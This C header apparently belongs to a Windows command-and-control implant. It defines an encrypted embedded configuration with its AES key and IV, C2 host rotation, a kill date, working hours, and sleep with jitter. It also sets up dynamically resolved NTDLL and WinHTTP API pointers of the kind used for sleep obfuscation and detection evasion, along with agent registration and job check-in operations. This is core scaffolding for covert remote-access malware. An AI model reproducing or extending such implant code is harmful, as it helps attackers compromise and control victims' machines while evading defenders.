#pragma once
#include "Common.h"

#define AGENT_MAGIC_VALUE 0x0041153C //allsec in l33t speak.
//config bytes
#define CONFIG_BYTES {0xf6,0x62,0x9d,0xd5,0x4e,0x99,0x28,0xa3,0x94,0xb3,0x11,0x04,0xff,0x2b,0xd3,0xdd,0x73,0x9d,0x40,0x1e,0xc5,0x20,0xc0,0x33,0xd8,0xa9,0xa8,0xd2,0xd2,0xda,0xcd,0x68,0x02,0x09,0x3c,0xcc,0x73,0xd6,0xa6,0x26,0xb4,0x45,0xe2,0xf9,0xee,0x12,0x22,0xf1,0x45,0xef,0xb5,0xe9,0x79,0x15,0x40,0xb5,0x66,0x4d,0xb4,0xec,0x49,0xd1,0x54,0xfa,0xd9,0x40,0xa4,0xb9,0xd5,0xc3,0x13,0x88,0xfc,0x77,0xc7,0x28,0x3b,0xdb,0xb5,0x5f,0x62,0x74,0x99,0x18,0xcc,0xc7,0x84,0x7c,0x59,0xa5,0x2e,0xa0,0xbe,0x8d,0xb9,0xe9,0x41,0x19,0xe5,0x85,0x75,0x2e,0x2f,0x77,0x5f,0x7d,0xf4,0x34,0xd5,0xb1,0x42,0xb7,0x39,0xb9,0xf4,0xa4,0x0f,0xaf,0x06,0x16,0xb8,0xf9,0x52,0x8d,0xcb,0x44,0xd7,0xa1,0x1c,0xba,0x89,0xdd,0xbe,0x8d,0xe6,0x05,0x07,0x67,0x2a,0x02,0xf7,0x22,0xe0,0x10,0x60,0x8b,0xb3,0x5d,0x56,0xb9,0xbe,0x48,0xca,0x7f,0x6d,0xd9,0x63,0x19,0x9f,0xef,0x40,0x68,0x96,0x7b,0x41,0xcd,0xd7,0x8f,0xb3,0xbf,0x76,0xe5,0xf1,0x08,0xaa,0xf8,0x86,0xf6,0x2e,0x8a,0x64,0x84,0x61,0xed,0x74,0xdd,0xcd,0x93,0x2d,0xf3,0x43,0x79,0xaa,0xec,0xba,0x21,0xb0,0x4c,0xb8,0xb8,0x4b,0xda,0xeb,0xef,0x58,0x9d,0x08,0x71,0xde,0xb6,0xf4,0x6e,0x33,0x6f,0x89,0x09,0x1c,0x92,0xb7,0x79,0x59,0x2d,0xe0,0xa0,0xd5,0x56,0x9c,0xa9,0x36,0x6d,0xed,0x46,0x85,0xe6,0x95,0x83,0x80,0x45,0x33,0x73,0x33,0xcc,0x1c,0xb9,0xce,0xb8,0xfe,0xaa,0x4f,0x1d,0x77,0x0a,0x5a,0x3d,0xa7,0xba,0xce,0x83,0xdf,0xab,0xcc,0x1d,0xcc,0x52,0x84,0xc5,0xf8,0x2d,0x70,0x46,0xa1,0x58,0xcf,0xdd,0xa9,0xbf,0xd4,0x5a,0xc6,0xa4,0xb7,0xa5,0xfb,0x8d,0x22,0xd8,0x92,0x1f,0x9f,0x0b,0xbc,0x2d,0x1b,0xf1,0xf6,0x4f,0x37,0xb1,0x0e,0x7b,0x4b,0xf2,0x14,0x54,0x54,0x32,0xd8,0xb6,0xaa,0x71,0x84,0x52,0xbd,0x7e,0x6c,0x02,0xe5,0x44,0xeb,0x2c,0x4a,0xda,0xb0,0xda,0xcd,0xab,0x66,0xb3,0xee,0xf6,0x88,0xd5,0x03,0xe1,0xda,0x2c,0x78,0xe5,0x0e,0x57,0xa5,0x36,0x41,0x6b,0x58,0x49,0x2a,0xb1,0x4c,0xc5,0x01,0xfc,0xfe,0xd0,0x60,0xc6,0x53,0x4e,0x27,0xb9,0x3b,0x7c,0xbd,0x2f,0xb0,0x81,0xb0,0xcd,0xe0,0xc2,0xe5,0x21,0xe7,0xe2,0xd0,0xc6,0x29,0x5e,0x6a,0xb5,0xc3,0x65,0x48,0x67,0x18,0x62,0x19,0x25,0x2e,0x71,0xd3,0x7b,0xac,0xd3,0x4a,0x23,0x8f,0x1d,0x10,0xa9,0x2f,0x38,0x1f,0x88,0x4e,0xa9,0x8c,0x95,0xb8,0xdc,0xf4,0x26,0x04,0x07,0x81,0x6d,0x9c,0x5a,0xa3,0x39,0xe7,0x8c,0x8f,0xdf,0xcb,0x31,0xde,0xfd,0xcf,0x77,0x43,0xef,0x17,0xd0,0x31,0xfd,0xc3,0x76,0x3c,0xfd,0x48,0xa8,0xa2,0xcb,0x22,0x65,0xf5,0xd2,0x0e,0x73,0x43,0xaf,0xb7,0xc7,0xb8,0x0f,0xd2,0xd5,0xa1,0xbd,0x1e,0xce,0xe7,0x86,0xf7,0x86,0xac,0x01,0x86,0xe8,0x2a,0xa8,0xdd,0x96,0x22,0x1c,0xce,0xef,0x72,0xb1,0x3b,0x06,0x29,0x65,0x0c,0x1b,0x30,0x08,0x36,0xa2,0xf5,0x59,0xf5,0x88,0x12,0xef,0xb5,0xf0,0x38,0x5d,0x98,0xe2,0x56,0x56,0x2b,0x22,0x1a,0xaa,0x8c,0x6d,0x14,0xd6,0xe6,0x89,0x4e,0x55,0x9e,0x70,0xd1,0xd2,0x90,0x41,0x0d,0x1c,0xc5,0x08,0x65,0x2f,0xb5,0x57,0x6b,0x59,0x35,0x01,0xb2,0x0e,0xeb,0xe5,0x99,0x46,0xff,0x90,0x76,0xd3,0x83,0x01,0x43,0x33,0x7f,0xac,0xc0,0xb6,0xae,0xdd,0x56,0xec,0xf8,0xc1,0xf2,0x10,0x09,0x06,0x1b,0xf8,0x01,0x74,0x05,0xf4,0x59,0x34,0xc0,0x73,0x22,0x1d,0x06,0x56,0x4f,0x99,0x18,0x9e,0xe1,0xcb,0x22,0xed,0x66,0xad,0xbb,0x9f,0xca,0x58,0x68,0xc4,0xa0,0x98,0xd6,0x25,0x26,0x74,0xd7,0x68,0x80,0x9d,0x31,0x0b,0xfd,0x1e,0x1c,0x8f,0x51,0x1f,0x69,0xa0,0xc9,0x37,0x4b,0xd1,0xb8,0xf0,0xca,0x5b,0x47,0x82,0xd5,0xbe,0x87,0x6d,0x9d,0xa7,0xe2,0x2d,0x3d,0x3c,0x07,0xb4,0x71,0x9c,0x2a,0xd3,0x7d,0x5e,0x28,0xfa,0xb0,0x7a,0x35,0xa7,0xb5,0x8f,0xcf,0xe3,0x9f,0xd4,0xb6,0xb0,0x40,0x7d,0xa3,0x81,0x9d,0x74,0x6d,0x93,0x26,0x32,0x16,0x06,0x06,0x71,0x50,0xaa,0x86,0xaf,0x8b,0x6f,0xb3,0xc2,0x1b,0xd4,0x80,0xb6,0xa0,0xc3,0x13,0x78,0x0b,0xe1,0xd3,0x81,0x14,0x85,0x9d,0x57,0x88,0x12,0xcb,0xc2,0x8b,0xa8,0xac,0xca,0xbc,0xa0,0x2b,0xbc,0x4d}
#define CONFIG_KEY_BYTES {0xcc,0xa1,0x47,0x1a,0x4b,0x85,0x40,0x26,0xde,0xdc,0x61,0x8e,0xb4,0xe7,0xfe,0x02,0x6d,0xb4,0x4c,0xbb,0xa3,0xa0,0x15,0x53,0xae,0x50,0x7c,0xb8,0x7c,0xcc,0xd9,0x17}
#define CONFIG_IV_BYTES {0xcf,0xd4,0x5f,0x76,0x31,0xb2,0x75,0xa0,0x41,0xda,0xc9,0xef,0x23,0xb1,0x3e,0xa8}
#define HASH_CONFIG_BYTES {0xcc,0x31,0x8e,0x9d,0x9c,0xae,0xb3,0x45,0xe5,0xa2,0xe9,0x19,0xec,0x2a,0x06,0x23,0x37,0x07,0xa7,0x3c,0x0e,0x1f,0x3d,0x3f,0xca,0x95,0xe5,0x8f,0x9f,0x3e,0x73,0xa2,0x06,0x7e,0x51,0x36,0x9c,0x58,0x8f,0xe5,0xda,0xc1,0x8e,0x47,0xa3,0x40,0x1a,0x0e,0x0d,0x70,0x77,0xfb,0xba,0xa0,0x75,0x76,0x8a,0x33,0x77,0x70,0x20,0x30,0xb3,0xcd,0x27,0xb1,0x4e,0x7f,0x2c,0x86,0x61,0x84,0x53,0xad,0x04,0xaf,0x36,0x96,0xae,0xaa,0x36,0x3e,0x43,0xcb,0x49,0x6a,0x93,0x84,0x4e,0x19,0x23,0xe3,0xd2,0x9f,0x16,0xb2,0xf8,0xb1,0x75,0x9c,0xc5,0xdc,0x2e,0x88,0xc2,0x7e,0xf5,0x66,0x25,0x71,0x9a,0x36,0xc4,0xe8,0x1f,0x77,0x54,0xbb,0x8f,0x52,0x01,0x48,0xa8,0x25,0x5b,0xd2,0xcf,0x25,0xb8,0xcb,0x76,0xd3,0xfd,0xeb,0xc3,0x04,0x13,0xb4,0xa8,0xa4,0x83,0x99,0xab,0x4f,0x0d,0xcd,0xc0,0x3c,0xba,0x7e,0xdf,0x0c,0x65,0x23,0x40,0x45,0x51,0x5f,0xf6,0x7c,0x43,0x64,0x97,0x51,0xae,0x55,0x6f,0xf2,0xce,0x5a,0xfb,0x47,0x03,0x6f,0x96,0x1d,0x7e,0x95,0x0f,0x90,0xb3,0x0d,0xf3,0x17,0x84,0xdf,0xc9,0xdf,0xba,0x6e,0x2c,0xab,0x2f,0x58,0x19,0xca,0x78,0x1b,0x3e,0x50,0x6d,0xec,0x6e,0x79,0x95,0xe9,0x4f,0xd5,0xf6,0xbf,0x35,0x5a,0x96,0xf5,0xda,0x6d,0x1b,0x07,0xa4,0xc5,0xd7,0x62,0x13,0x29,0x6e,0xab,0x7a,0xe3,0xcf,0x14,0x6b,0x1b,0x34,0xe1,0x9d,0xab,0x4c,0xf4,0xf1,0x59,0xd2,0xf3,0xe7,0x20,0xe8,0xa1,0xf0,0xe2,0x42,0x09,0x7a,0x9e,0x67,0xb9,0x3c,0x3b,0x31,0xe6,0x8a,0x6b,0x54,0x3e,0xa2,0x4c,0x70,0xca,0x5c,0x45,0x1f,0x1b,0x93,0x65,0x03,0x70,0x41,0x01,0xc2,0x8c,0xc8,0x49,0x98,0x11,0xaf,0xfd,0xc4,0x34,0x0e,0x1d,0xfe,0x72,0x75,0x7b,0xed,0xe2,0x8b,0x1a,0xb0,0xb1,0xc4,0x85,0xfd,0xee,0x7e,0x01,0xdb,0x15,0x02,0x2b,0x23,0xb8,0x3f,0xb4,0xc9,0x51,0x7b,0xd7,0x47,0xa4,0xec,0x71,0x25,0xae,0x76,0xbd,0xde,0xdd,0x1f,0xf2,0x93,0x2e,0xbc,0x29,0x39,0x3b,0x82,0x8e,0x38,0xa7,0xb0,0x75,0x40,0x0a,0xcd,0xa3,0xf6,0xc5,0x50,0x03,0x5b,0xf1,0x42,0xef,0xce,0x25,0x54,0x4b,0x9b,0x48,0x57,0x06,0xab,0x86,0x8f,0xed,0x9b,0xf1,0x2a,0xa4,0x68,0xff,0xef,0x2a,0x38,0x56,0x67,0x51,0x62,0x88,0x34,0x9e,0xad,0xf3,0x17,0x48,0xdb,0x46,0x1e,0xc4,0x20,0xd7,0xd3,0x0c,0x8e,0x20,0xcf,0x2d,0x37,0xbf,0x12,0x89,0xb9,0x2a,0x52,0x20,0x24,0x3c,0xae,0x33,0x3c,0x7d,0xb5,0xf9,0xec,0x46,0x10,0x6e,0x50,0x74,0x01,0x8d,0x36,0x6c,0x08,0x60,0x7a,0x32,0xfb,0x4f,0x68,0xa1,0x44,0xd2,0xab,0x07,0x71,0x57,0x44,0x43,0x74,0x12,0x84,0xb3,0xbf,0x6f,0x04,0x3b,0x54,0x36,0x60}
#define HASH_KEY_BYTES {0x37,0xf8,0x19,0x03,0x31,0x0e,0x7a,0x99,0x62,0xe9,0x34,0xff,0x6d,0xfb,0xe2,0x04,0xb7,0x5d,0xaa,0x62,0x0f,0x72,0xef,0x52,0xdf,0x44,0xb6,0x5d,0x73,0x6d,0xde,0xd2}
#define HASH_IV_BYTES {0xa5,0x1e,0x5f,0x5c,0x32,0x7a,0x8e,0x64,0x03,0x33,0x42,0xf5,0xde,0x34,0xff,0x73} 

struct Packges; // forward declaration so it can be included in the packages.h header file w/o having to include packages.h here Causing cyclic dependencies.

typedef struct _ContextInfo {
	DWORD dwMajorVersion;
	DWORD dwMinorVersion;
	DWORD dwBuildNumber;
	DWORD dwPlatformId;
	WORD   wServicePackMajor;
	WORD   wServicePackMinor;
	WORD   wSuiteMask;
	BYTE  wProductType;
	LPSTR UserName;
	LPSTR ComputerName;
	LPSTR IPAddress[10][5];
	DWORD PID;
	DWORD TID;
	DWORD PPID;
	WORD OS_Arch;
	WORD Process_Arch;
	BOOL Elevated;
} ContextInfo, *PContextInfo ;



typedef struct _HostData {
	LPWSTR Host;
	INT Port;
	BOOL Alive;
	INT NumFailures;
	struct _HostData* Next;
} HostData, * pHostData;

typedef struct _ListenerConfig {
	DWORD HostRotation;
	pHostData Hosts;
	pHostData CurrentHost;
	UINT NumHosts;
	DWORD Port;
	BOOL Secure;
	LPWSTR Method;
	LPWSTR* Headers;
	LPWSTR UserAgent;

} ListenerConfig, *pListenerConfig;

//TODO FINISH ADDING LISTENER / AGENT CONFIG DATA/
typedef struct _AgentConfig {

	UINT64 KillDate;
	UINT32 WorkingHours;
	UINT32 SleepTime;
	UINT32 SleepJitter;
	DWORD AgentID;
	BYTE* RSAPubKey;
	DWORD RSAPubKeySize;
	LPSTR AgentName;
	pListenerConfig listenerConfig;

} AgentConfig, *PAgentConfig;

typedef struct _HttpSession {
	BOOL Active;
} HttpSession, *pHttpSession;


typedef struct _Win32 {
	//enumeration apis
	//NTDLL APIS
	HMODULE hNtdll;
	t_RtlGetVersion pRtlGetVersion;
	t_NtClose pNtClose;
	t_NtOpenProcessToken pNtOpenProcessToken;
	t_NtOpenThreadToken pNtOpenThreadToken;
	t_NtQueryInformationToken pNtQueryInformationToken;
	t_RtlAllocateHeap pRtlAllocateHeap;
	t_RtlReAllocateHeap pRtlReAllocateHeap;
	t_RtlRandomEx pRtlRandomEx;
	t_NtGetTickCount pNtGetTickCount;
	t_RtlCreateTimerQueue pRtlCreateTimerQueue;
	t_NtCreateEvent pNtCreateEvent;
	t_RtlCaptureContext pRtlCaptureContext;
	t_RtlCreateTimer pRtlCreateTimer;
	t_RtlRegisterWait pRtlRegisterWait;
	t_RtlDeleteTimerQueue pRtlDeleteTimerQueue;
	t_RtlCopyMappedMemory pRtlCopyMappedMemory;
	t_NtWaitForSingleObject pNtWaitForSingleObject;
	t_NtSignalAndWaitForSingleObject pNtSignalAndWaitForSingleObject;
	t_NtContinue pNtContinue;
	t_NtSetEvent pNtSetEvent;
	t_NtSetContextThread pNtSetContextThread;
	t_NtDuplicateObject pNtDuplicateObject;


	//KERNEL32 APIS
	HMODULE hKernel32;
	t_GetComputerNameExA pGetComputerNameExA;
	t_LocalAlloc pLocalAlloc;
	t_LocalReAlloc pLocalReAlloc;
	t_LocalFree pLocalFree;
	t_GetSystemTimeAsFileTime pGetSystemTimeAsFileTime;
	t_GetLocalTime pGetLocalTime;
	t_LoadLibraryA pLoadLibraryA;
	t_GetProcAddress pGetProcAddress;
	t_VirtualProtect pVirtualProtect;
	t_WaitForSingleObjectEx pWaitForSingleObjectEx;

	//ADVAPI APIS
	HMODULE hAdvapi32;
	t_GetUserNameA pGetUserNameA;
	t_SystemFunction032 pSystemFunction032;

	//USER32 APIS
	HMODULE hUser32;
	t_GetSystemMetrics pGetSystemMetrics;

	//IPHLPAPI APIS'
	HMODULE hIphlpapi;
	t_GetAdaptersInfo pGetAdaptersInfo;

	//http request APIS
	//WINHTTP APIS
	HMODULE hWinHttp;
	t_WinHttpOpen pWinHttpOpen;
	t_WinHttpConnect pWinHttpConnect;
	t_WinHttpOpenRequest pWinHttpOpenRequest;
	t_WinHttpSendRequest pWinHttpSendRequest;
	t_WinHttpReceiveResponse pWinHttpReceiveResponse;
	t_WinHttpQueryHeaders pWinHttpQueryHeaders;
	t_WinHttpAddRequestHeaders pWinHttpAddRequestHeaders;
	t_WinHttpSetOption pWinHttpSetOption;
	t_WinHttpReadData pWinHttpReadData;
	t_WinHttpCloseHandle pWinHttpCloseHandle;

} Win32, * pWin32;

typedef struct _AgentCMD {
	UINT CommandID;
	UINT RequestID;
	BYTE* DATA;
} AgentCMD, * pAgentCMD;

//TODO clean up this structure.
//I.E. make strcutrues for module hanldes, function pointers, etc. and include them in this parent structure rather than all directly.
typedef struct _Agent {


	pWin32 apis;

	//agent configuration
	PAgentConfig config;

	//current context info
	PContextInfo Context;

	//Session Info
	pHttpSession session;

	//active threads
	BOOL ActiveThreads;

	//ImageBase Address
	PVOID ModuleBaseAddr;

	//Image Size
	DWORD ImageSize;

	P_INT_TEB pTeb;

	//crypto info.
	BYTE* AESKey;
	ULONG AESKeySize;
	BYTE* EncryptedAESKey;
	ULONG EncryptedAESKeySize;
	BYTE* IV;
	ULONG IVSize;
	BYTE* EncryptedIV;
	ULONG EncryptedIVSize;

	struct _Package* MetaDataPackage;
	struct _Package* packages;


}Agent, * pAgent;


extern pAgent agent;

enum Agent_Operations {
	REGISTER_AGENT = 0,
	EXIT_AGENT,
	SLEEP_AGENT,
	GET_AGENT_JOB,
	CHECKIN_AGENT,
	NO_JOB,
};


INT init_agent();
INT RegisterAgent();
void AgentMain();
INT ParseConfig();
BOOL ParseHashConfig();
void AgentRoutine();